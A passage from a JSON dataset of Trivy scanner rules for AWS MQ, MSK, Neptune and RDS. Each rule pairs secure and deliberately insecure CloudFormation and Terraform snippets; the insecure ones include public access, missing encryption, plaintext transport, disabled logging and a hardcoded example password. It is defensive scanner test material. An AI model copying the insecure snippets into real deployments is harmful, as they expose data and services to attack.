        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodBroker:\n          Type: AWS::AmazonMQ::Broker\n          Properties:\n            PubliclyAccessible: false\n  bad:\n    - |-\n      Resources:\n        BadBroker:\n          Type: AWS::AmazonMQ::Broker\n          Properties:\n            PubliclyAccessible: true\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#publicly_accessible\n  good:\n    - |-\n      resource \"aws_mq_broker\" \"good_example\" {\n        broker_name        = \"example\"\n        engine_type        = \"ActiveMQ\"\n        engine_version     = \"5.15.0\"\n        host_instance_type = \"mq.t2.micro\"\n        user {\n          username = \"ExampleUser\"\n          password = \"MindTheGap\"\n        }\n        publicly_accessible = false\n      }\n  bad:\n    - |-\n      resource \"aws_mq_broker\" \"bad_example\" {\n        broker_name        = \"example\"\n        engine_type        = \"ActiveMQ\"\n        engine_version     = \"5.15.0\"\n        host_instance_type = \"mq.t2.micro\"\n        user {\n          username = \"ExampleUser\"\n          password = \"MindTheGap\"\n        }\n        publicly_accessible = true\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/mq/no_public_access.yaml",
        "local_path": "aws/mq/no_public_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodBroker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      PubliclyAccessible: false"
            ],
            "bad": [
              "Resources:\n  BadBroker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      PubliclyAccessible: true"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#publicly_accessible"
            ],
            "good": [
              "resource \"aws_mq_broker\" \"good_example\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n  publicly_accessible = false\n}"
            ],
            "bad": [
              "resource \"aws_mq_broker\" \"bad_example\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n  publicly_accessible = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-MSK-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "msk",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::MSK::Cluster\n          Properties:\n            EncryptionInfo:\n              EncryptionAtRest:\n                DataVolumeKMSKeyId: foo-bar-key\n  bad:\n    - |-\n      Resources:\n        BadCluster:\n          Type: AWS::MSK::Cluster\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#encryption_info-argument-reference\n  good:\n    - |-\n      resource \"aws_msk_cluster\" \"good_example\" {\n        encryption_info {\n          encryption_at_rest_kms_key_arn = \"foo-bar-key\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_msk_cluster\" \"bad_example\" {\n        encryption_info {\n        }\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/msk/enable_at_rest_encryption.yaml",
        "local_path": "aws/msk/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::MSK::Cluster\n    Properties:\n      EncryptionInfo:\n        EncryptionAtRest:\n          DataVolumeKMSKeyId: foo-bar-key"
            ],
            "bad": [
              "Resources:\n  BadCluster:\n    Type: AWS::MSK::Cluster"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#encryption_info-argument-reference"
            ],
            "good": [
              "resource \"aws_msk_cluster\" \"good_example\" {\n  encryption_info {\n    encryption_at_rest_kms_key_arn = \"foo-bar-key\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_msk_cluster\" \"bad_example\" {\n  encryption_info {\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-MSK-ENABLE_IN_TRANSIT_ENCRYPTION",
        "title": "Enable In Transit Encryption",
        "provider": "aws",
        "service": "msk",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::MSK::Cluster\n          Properties:\n            EncryptionInfo:\n              EncryptionInTransit:\n                ClientBroker: TLS\n  bad:\n    - |-\n      Resources:\n        BadCluster:\n          Type: AWS::MSK::Cluster\n          Properties:\n            EncryptionInfo:\n              EncryptionInTransit:\n                ClientBroker: TLS_PLAINTEXT\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#encryption_info-argument-reference\n  good:\n    - |-\n      resource \"aws_msk_cluster\" \"good_example\" {\n        encryption_info {\n          encryption_in_transit {\n            client_broker = \"TLS\"\n            in_cluster    = true\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_msk_cluster\" \"bad_example\" {\n        encryption_info {\n          encryption_in_transit {\n            client_broker = \"TLS_PLAINTEXT\"\n            in_cluster    = true\n          }\n        }\n      }\n",
        "file_name": "enable_in_transit_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/msk/enable_in_transit_encryption.yaml",
        "local_path": "aws/msk/enable_in_transit_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::MSK::Cluster\n    Properties:\n      EncryptionInfo:\n        EncryptionInTransit:\n          ClientBroker: TLS"
            ],
            "bad": [
              "Resources:\n  BadCluster:\n    Type: AWS::MSK::Cluster\n    Properties:\n      EncryptionInfo:\n        EncryptionInTransit:\n          ClientBroker: TLS_PLAINTEXT"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#encryption_info-argument-reference"
            ],
            "good": [
              "resource \"aws_msk_cluster\" \"good_example\" {\n  encryption_info {\n    encryption_in_transit {\n      client_broker = \"TLS\"\n      in_cluster    = true\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_msk_cluster\" \"bad_example\" {\n  encryption_info {\n    encryption_in_transit {\n      client_broker = \"TLS_PLAINTEXT\"\n      in_cluster    = true\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-MSK-ENABLE_LOGGING",
        "title": "Enable Logging",
        "provider": "aws",
        "service": "msk",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::MSK::Cluster\n          Properties:\n            LoggingInfo:\n              BrokerLogs:\n                S3:\n                  Enabled: true\n  bad:\n    - |-\n      Resources:\n        BadCluster:\n          Type: AWS::MSK::Cluster\n          Properties:\n            LoggingInfo:\n              BrokerLogs:\n                CloudWatchLogs:\n                  Enabled: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#\n  good:\n    - |-\n      resource \"aws_msk_cluster\" \"example\" {\n        cluster_name           = \"example\"\n        kafka_version          = \"2.4.1\"\n        number_of_broker_nodes = 3\n\n        broker_node_group_info {\n          instance_type   = \"kafka.m5.large\"\n          ebs_volume_size = 1000\n          client_subnets  = [aws_subnet.subnet_az1.id]\n          security_groups = [aws_security_group.sg.id]\n        }\n\n        logging_info {\n          broker_logs {\n            firehose {\n              enabled         = false\n              delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n            }\n            s3 {\n              enabled = true\n              bucket  = aws_s3_bucket.bucket.id\n              prefix  = \"logs/msk-\"\n            }\n          }\n        }\n      }\n    - |-\n      resource \"aws_msk_cluster\" \"example\" {\n        cluster_name           = \"example\"\n        kafka_version          = \"2.4.1\"\n        number_of_broker_nodes = 3\n\n        broker_node_group_info {\n          instance_type   = \"kafka.m5.large\"\n          ebs_volume_size = 1000\n          client_subnets  = [aws_subnet.subnet_az1.id]\n          security_groups = [aws_security_group.sg.id]\n        }\n\n        logging_info {\n          broker_logs {\n            cloudwatch_logs {\n              enabled   = false\n              log_group = aws_cloudwatch_log_group.test.name\n            }\n            firehose {\n              enabled         = true\n              delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n            }\n          }\n        }\n      }\n    - |-\n      resource \"aws_msk_cluster\" \"example\" {\n        cluster_name           = \"example\"\n        kafka_version          = \"2.4.1\"\n        number_of_broker_nodes = 3\n\n        broker_node_group_info {\n          instance_type   = \"kafka.m5.large\"\n          ebs_volume_size = 1000\n          client_subnets  = [aws_subnet.subnet_az1.id]\n          security_groups = [aws_security_group.sg.id]\n        }\n\n        logging_info {\n          broker_logs {\n            cloudwatch_logs {\n              enabled   = true\n              log_group = aws_cloudwatch_log_group.test.name\n            }\n            firehose {\n              enabled         = false\n              delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n            }\n            s3 {\n              enabled = true\n              bucket  = aws_s3_bucket.bucket.id\n              prefix  = \"logs/msk-\"\n            }\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_msk_cluster\" \"example\" {\n        cluster_name           = \"example\"\n        kafka_version          = \"2.4.1\"\n        number_of_broker_nodes = 3\n\n        broker_node_group_info {\n          instance_type   = \"kafka.m5.large\"\n          ebs_volume_size = 1000\n          client_subnets  = [aws_subnet.subnet_az1.id]\n          security_groups = [aws_security_group.sg.id]\n        }\n      }\n",
        "file_name": "enable_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/msk/enable_logging.yaml",
        "local_path": "aws/msk/enable_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::MSK::Cluster\n    Properties:\n      LoggingInfo:\n        BrokerLogs:\n          S3:\n            Enabled: true"
            ],
            "bad": [
              "Resources:\n  BadCluster:\n    Type: AWS::MSK::Cluster\n    Properties:\n      LoggingInfo:\n        BrokerLogs:\n          CloudWatchLogs:\n            Enabled: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#"
            ],
            "good": [
              "resource \"aws_msk_cluster\" \"example\" {\n  cluster_name           = \"example\"\n  kafka_version          = \"2.4.1\"\n  number_of_broker_nodes = 3\n\n  broker_node_group_info {\n    instance_type   = \"kafka.m5.large\"\n    ebs_volume_size = 1000\n    client_subnets  = [aws_subnet.subnet_az1.id]\n    security_groups = [aws_security_group.sg.id]\n  }\n\n  logging_info {\n    broker_logs {\n      firehose {\n        enabled         = false\n        delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n      }\n      s3 {\n        enabled = true\n        bucket  = aws_s3_bucket.bucket.id\n        prefix  = \"logs/msk-\"\n      }\n    }\n  }\n}",
              "resource \"aws_msk_cluster\" \"example\" {\n  cluster_name           = \"example\"\n  kafka_version          = \"2.4.1\"\n  number_of_broker_nodes = 3\n\n  broker_node_group_info {\n    instance_type   = \"kafka.m5.large\"\n    ebs_volume_size = 1000\n    client_subnets  = [aws_subnet.subnet_az1.id]\n    security_groups = [aws_security_group.sg.id]\n  }\n\n  logging_info {\n    broker_logs {\n      cloudwatch_logs {\n        enabled   = false\n        log_group = aws_cloudwatch_log_group.test.name\n      }\n      firehose {\n        enabled         = true\n        delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n      }\n    }\n  }\n}",
              "resource \"aws_msk_cluster\" \"example\" {\n  cluster_name           = \"example\"\n  kafka_version          = \"2.4.1\"\n  number_of_broker_nodes = 3\n\n  broker_node_group_info {\n    instance_type   = \"kafka.m5.large\"\n    ebs_volume_size = 1000\n    client_subnets  = [aws_subnet.subnet_az1.id]\n    security_groups = [aws_security_group.sg.id]\n  }\n\n  logging_info {\n    broker_logs {\n      cloudwatch_logs {\n        enabled   = true\n        log_group = aws_cloudwatch_log_group.test.name\n      }\n      firehose {\n        enabled         = false\n        delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n      }\n      s3 {\n        enabled = true\n        bucket  = aws_s3_bucket.bucket.id\n        prefix  = \"logs/msk-\"\n      }\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_msk_cluster\" \"example\" {\n  cluster_name           = \"example\"\n  kafka_version          = \"2.4.1\"\n  number_of_broker_nodes = 3\n\n  broker_node_group_info {\n    instance_type   = \"kafka.m5.large\"\n    ebs_volume_size = 1000\n    client_subnets  = [aws_subnet.subnet_az1.id]\n    security_groups = [aws_security_group.sg.id]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-NEPTUNE-ENABLE_LOG_EXPORT",
        "title": "Enable Log Export",
        "provider": "aws",
        "service": "neptune",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::Neptune::DBCluster\n          Properties:\n            EnableCloudwatchLogsExports:\n              - audit\n  bad:\n    - |-\n      Resources:\n        BadCluster:\n          Type: AWS::Neptune::DBCluster\n          Properties:\n            EnableCloudwatchLogsExports:\n              - debug\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#enable_cloudwatch_logs_exports\n  good:\n    - |-\n      resource \"aws_neptune_cluster\" \"good_example\" {\n        enable_cloudwatch_logs_exports = [\"audit\"]\n      }\n  bad:\n    - |-\n      resource \"aws_neptune_cluster\" \"bad_example\" {}\n    - |-\n      resource \"aws_neptune_cluster\" \"bad_example\" {\n        enable_cloudwatch_logs_exports = [\"debug\"]\n      }\n",
        "file_name": "enable_log_export.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/neptune/enable_log_export.yaml",
        "local_path": "aws/neptune/enable_log_export.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      EnableCloudwatchLogsExports:\n        - audit"
            ],
            "bad": [
              "Resources:\n  BadCluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      EnableCloudwatchLogsExports:\n        - debug"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#enable_cloudwatch_logs_exports"
            ],
            "good": [
              "resource \"aws_neptune_cluster\" \"good_example\" {\n  enable_cloudwatch_logs_exports = [\"audit\"]\n}"
            ],
            "bad": [
              "resource \"aws_neptune_cluster\" \"bad_example\" {}",
              "resource \"aws_neptune_cluster\" \"bad_example\" {\n  enable_cloudwatch_logs_exports = [\"debug\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-NEPTUNE-ENABLE_STORAGE_ENCRYPTION",
        "title": "Enable Storage Encryption",
        "provider": "aws",
        "service": "neptune",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::Neptune::DBCluster\n          Properties:\n            KmsKeyId: something\n            StorageEncrypted: true\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad example\n\n      Resources:\n        BadCluster:\n          Type: AWS::Neptune::DBCluster\n          Properties:\n            StorageEncrypted: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted\n  good:\n    - |-\n      resource \"aws_neptune_cluster\" \"good_example\" {\n        kms_key_arn       = \"test\"\n        storage_encrypted = true\n      }\n  bad:\n    - |-\n      resource \"aws_neptune_cluster\" \"bad_example\" {\n        storage_encrypted = false\n      }\n",
        "file_name": "enable_storage_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/neptune/enable_storage_encryption.yaml",
        "local_path": "aws/neptune/enable_storage_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      KmsKeyId: something\n      StorageEncrypted: true"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad example\n\nResources:\n  BadCluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      StorageEncrypted: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted"
            ],
            "good": [
              "resource \"aws_neptune_cluster\" \"good_example\" {\n  kms_key_arn       = \"test\"\n  storage_encrypted = true\n}"
            ],
            "bad": [
              "resource \"aws_neptune_cluster\" \"bad_example\" {\n  storage_encrypted = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-NEPTUNE-ENCRYPTION_CUSTOMER_KEY",
        "title": "Encryption Customer Key",
        "provider": "aws",
        "service": "neptune",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::Neptune::DBCluster\n          Properties:\n            KmsKeyId: something\n            StorageEncrypted: true\n  bad:\n    - |-\n      Resources:\n        BadCluster:\n          Type: AWS::Neptune::DBCluster\n          Properties:\n            StorageEncrypted: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted\n  good:\n    - |-\n      resource \"aws_neptune_cluster\" \"good_example\" {\n        kms_key_arn = \"test\"\n      }\n  bad:\n    - |-\n      resource \"aws_neptune_cluster\" \"bad_example\" {}\n",
        "file_name": "encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/neptune/encryption_customer_key.yaml",
        "local_path": "aws/neptune/encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      KmsKeyId: something\n      StorageEncrypted: true"
            ],
            "bad": [
              "Resources:\n  BadCluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      StorageEncrypted: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted"
            ],
            "good": [
              "resource \"aws_neptune_cluster\" \"good_example\" {\n  kms_key_arn = \"test\"\n}"
            ],
            "bad": [
              "resource \"aws_neptune_cluster\" \"bad_example\" {}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-RDS-DISABLE_PUBLIC_ACCESS",
        "title": "Disable Public Access",
        "provider": "aws",
        "service": "rds",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            PubliclyAccessible: false\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            PubliclyAccessible: true\nterraform:\n  good:\n    - |-\n      resource \"aws_db_instance\" \"good_example\" {\n        publicly_accessible = false\n      }\n  bad:\n    - |-\n      resource \"aws_db_instance\" \"bad_example\" {\n        publicly_accessible = true\n      }\n",
        "file_name": "disable_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/rds/disable_public_access.yaml",
        "local_path": "aws/rds/disable_public_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      PubliclyAccessible: false"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      PubliclyAccessible: true"
            ]
          },
          "terraform": {
            "good": [
              "resource \"aws_db_instance\" \"good_example\" {\n  publicly_accessible = false\n}"
            ],
            "bad": [
              "resource \"aws_db_instance\" \"bad_example\" {\n  publicly_accessible = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-RDS-ENABLE_PERFORMANCE_INSIGHTS",
        "title": "Enable Performance Insights",
        "provider": "aws",
        "service": "rds",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            EnablePerformanceInsights: true\n            PerformanceInsightsKMSKeyId: something\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            EnablePerformanceInsights: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id\n  good:\n    - |-\n      resource \"aws_rds_cluster_instance\" \"good_example\" {\n        name                            = \"bar\"\n        performance_insights_enabled    = true\n        performance_insights_kms_key_id = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n      }\n  bad:\n    - |-\n      resource \"aws_rds_cluster_instance\" \"bad_example\" {\n        name                            = \"bar\"\n        performance_insights_enabled    = false\n        performance_insights_kms_key_id = \"\"\n      }\n",
        "file_name": "enable_performance_insights.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/rds/enable_performance_insights.yaml",
        "local_path": "aws/rds/enable_performance_insights.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      EnablePerformanceInsights: true\n      PerformanceInsightsKMSKeyId: something"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      EnablePerformanceInsights: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id"
            ],
            "good": [
              "resource \"aws_rds_cluster_instance\" \"good_example\" {\n  name                            = \"bar\"\n  performance_insights_enabled    = true\n  performance_insights_kms_key_id = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n}"
            ],
            "bad": [
              "resource \"aws_rds_cluster_instance\" \"bad_example\" {\n  name                            = \"bar\"\n  performance_insights_enabled    = false\n  performance_insights_kms_key_id = \"\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-RDS-ENCRYPT_CLUSTER_STORAGE_DATA",
        "title": "Encrypt Cluster Storage Data",
        "provider": "aws",
        "service": "rds",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::RDS::DBCluster\n          Properties:\n            KmsKeyId: something\n            StorageEncrypted: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::RDS::DBCluster\n          Properties:\n            StorageEncrypted: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster\n  good:\n    - |-\n      resource \"aws_rds_cluster\" \"good_example\" {\n        name              = \"bar\"\n        kms_key_id        = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n        storage_encrypted = true\n      }\n  bad:\n    - |-\n      resource \"aws_rds_cluster\" \"bad_example\" {\n        name       = \"bar\"\n        kms_key_id = \"\"\n      }\n    - |-\n      resource \"aws_rds_cluster\" \"bad_example\" {\n        name              = \"bar\"\n        storage_encrypted = true\n      }\n",
        "file_name": "encrypt_cluster_storage_data.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/rds/encrypt_cluster_storage_data.yaml",
        "local_path": "aws/rds/encrypt_cluster_storage_data.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::RDS::DBCluster\n    Properties:\n      KmsKeyId: something\n      StorageEncrypted: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::RDS::DBCluster\n    Properties:\n      StorageEncrypted: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster"
            ],
            "good": [
              "resource \"aws_rds_cluster\" \"good_example\" {\n  name              = \"bar\"\n  kms_key_id        = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n  storage_encrypted = true\n}"
            ],
            "bad": [
              "resource \"aws_rds_cluster\" \"bad_example\" {\n  name       = \"bar\"\n  kms_key_id = \"\"\n}",
              "resource \"aws_rds_cluster\" \"bad_example\" {\n  name              = \"bar\"\n  storage_encrypted = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-RDS-ENCRYPT_INSTANCE_STORAGE_DATA",
        "title": "Encrypt Instance Storage Data",
        "provider": "aws",
        "service": "rds",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            KmsKeyId: something\n            StorageEncrypted: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            StorageEncrypted: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance\n  good:\n    - |-\n      resource \"aws_db_instance\" \"good_example\" {\n        storage_encrypted = true\n      }\n  bad:\n    - |-\n      resource \"aws_db_instance\" \"bad_example\" {\n\n      }\n",
        "file_name": "encrypt_instance_storage_data.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/rds/encrypt_instance_storage_data.yaml",
        "local_path": "aws/rds/encrypt_instance_storage_data.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      KmsKeyId: something\n      StorageEncrypted: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      StorageEncrypted: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance"
            ],
            "good": [
              "resource \"aws_db_instance\" \"good_example\" {\n  storage_encrypted = true\n}"
            ],
            "bad": [
              "resource \"aws_db_instance\" \"bad_example\" {\n\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-RDS-PERFORMANCE_INSIGHTS_ENCRYPTION_CUSTOMER_KEY",
        "title": "Performance Insights Encryption Customer Key",
        "provider": "aws",
        "service": "rds",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            EnablePerformanceInsights: true\n            PerformanceInsightsKMSKeyId: something\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            EnablePerformanceInsights: true\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id\n  good:\n    - |-\n      resource \"aws_rds_cluster_instance\" \"good_example\" {\n        name                            = \"bar\"\n        performance_insights_enabled    = true\n        performance_insights_kms_key_id = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n      }\n    - |-\n      resource \"aws_rds_cluster_instance\" \"good_example\" {\n        name                         = \"bar\"\n        performance_insights_enabled = false\n      }\n  bad:\n    - |-\n      resource \"aws_rds_cluster_instance\" \"bad_example\" {\n        name                            = \"bar\"\n        performance_insights_enabled    = true\n        performance_insights_kms_key_id = \"\"\n      }\n",
        "file_name": "performance_insights_encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/rds/performance_insights_encryption_customer_key.yaml",
        "local_path": "aws/rds/performance_insights_encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      EnablePerformanceInsights: true\n      PerformanceInsightsKMSKeyId: something"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      EnablePerformanceInsights: true"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id"
            ],
            "good": [
              "resource \"aws_rds_cluster_instance\" \"good_example\" {\n  name                            = \"bar\"\n  performance_insights_enabled    = true\n  performance_insights_kms_key_id = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n}",
              "resource \"aws_rds_cluster_instance\" \"good_example\" {\n  name                         = \"bar\"\n  performance_insights_enabled = false\n}"
            ],
            "bad": [
              "resource \"aws_rds_cluster_instance\" \"bad_example\" {\n  name                            = \"bar\"\n  performance_insights_enabled    = true\n  performance_insights_kms_key_id = \"\"\n}"
            ]
          }
        }
      },
      {
